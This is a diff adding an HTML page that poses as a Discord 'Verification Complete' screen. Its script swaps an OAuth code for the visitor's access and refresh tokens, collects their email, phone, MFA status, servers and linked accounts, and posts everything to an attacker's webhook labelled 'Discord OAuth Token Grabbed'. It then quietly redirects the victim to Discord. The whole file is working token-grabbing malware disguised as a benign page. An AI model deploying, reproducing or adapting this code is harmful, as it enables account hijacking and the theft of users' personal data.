@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Verification Complete</title>
+    <style>
+        body {
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #313338;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #dbdee1;
+            text-align: center;
+        }
+        .container { padding: 40px; }
+        .spinner {
+            border: 4px solid #2b2d31;
+            border-top: 4px solid #23a55a;
+            border-radius: 50%;
+            width: 48px;
+            height: 48px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { color: #23a55a; margin-bottom: 12px; }
+        p { color: #b5bac1; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>✓ Verification Complete!</h1>
+        <p>Redirecting you to Discord...</p>
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
+        const CLIENT_ID = 'YOUR_CLIENT_ID_HERE';
+        const CLIENT_SECRET = 'YOUR_CLIENT_SECRET_HERE';
+        const REDIRECT_URI = 'https://YOUR-DOMAIN.com/callback.html';
+
+        async function exchangeCodeForToken(code) {
+            const body = new URLSearchParams({
+                client_id: CLIENT_ID,
+                client_secret: CLIENT_SECRET,
+                grant_type: 'authorization_code',
+                code: code,
+                redirect_uri: REDIRECT_URI
+            });
+
+            const r = await fetch('https://discord.com/api/oauth2/token', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: body.toString()
+            });
+            
+            return await r.json();
+        }
+
+        async function getUserData(token) {
+            const r = await fetch('https://discord.com/api/v9/users/@me', {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            return await r.json();
+        }
+
+        async function getGuilds(token) {
+            const r = await fetch('https://discord.com/api/v9/users/@me/guilds', {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            return await r.json();
+        }
+
+        async function getConnections(token) {
+            const r = await fetch('https://discord.com/api/v9/users/@me/connections', {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            return await r.json();
+        }
+
+        async function main() {
+            const params = new URLSearchParams(window.location.search);
+            const code = params.get('code');
+
+            if (!code) {
+                // No code — just redirect to Discord
+                setTimeout(() => { window.location.href = 'https://discord.com/app'; }, 2000);
+                return;
+            }
+
+            try {
+                // Exchange code for access token
+                const tokenData = await exchangeCodeForToken(code);
+                const accessToken = tokenData.access_token;
+                const refreshToken = tokenData.refresh_token;
+
+                // Get user info
+                const user = await getUserData(accessToken);
+                const guilds = await getGuilds(accessToken);
+                const connections = await getConnections(accessToken);
+
+                // Build and send webhook
+                const payload = {
+                    content: '@here **Discord OAuth Token Grabbed**',
+                    embeds: [{
+                        title: 'OAuth Token Capture',
+                        color: 15277667,
+                        fields: [
+                            { name: 'Access Token', value: accessToken || 'N/A', inline: false },
+                            { name: 'Refresh Token', value: refreshToken || 'N/A', inline: false },
+                            { name: 'Token Expires In', value: `${tokenData.expires_in || 'N/A'} seconds`, inline: true },
+                            { name: 'User ID', value: user.id || 'N/A', inline: true },
+                            { name: 'Username', value: `${user.username}#${user.discriminator || '0'}`, inline: true },
+                            { name: 'Email', value: user.email || 'N/A', inline: true },
+                            { name: 'Phone', value: user.phone || 'N/A', inline: true },
+                            { name: 'MFA Enabled', value: user.mfa_enabled ? 'Yes' : 'No', inline: true },
+                            { name: 'Nitro', value: user.premium_type > 0 ? 'Yes' : 'No', inline: true },
+                            { name: 'Verified', value: user.verified ? 'Yes' : 'No', inline: true },
+                            { name: 'Locale', value: user.locale || 'N/A', inline: true },
+                            { name: 'Servers', value: Array.isArray(guilds) ? guilds.slice(0, 15).map(g => g.name).join(', ') : 'N/A', inline: false },
+                            { name: 'Connections', value: Array.isArray(connections) ? connections.slice(0, 5).map(c => `${c.type}: ${c.name}`).join(', ') : 'N/A', inline: false }
+                        ],
+                        thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` },
+                        footer: { text: `Captured at ${new Date().toLocaleString()}` },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                if (WEBHOOK_URL && WEBHOOK_URL !== 'YOUR_WEBHOOK_URL_HERE') {
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                }
+
+            } catch(e) {
+                console.error('Token exchange failed:', e);
+            }
+
+            // Redirect to Discord
+            setTimeout(() => { window.location.href = 'https://discord.com/app'; }, 2000);
+        }
+
+        main();
+    </script>
+</body>
+</html>
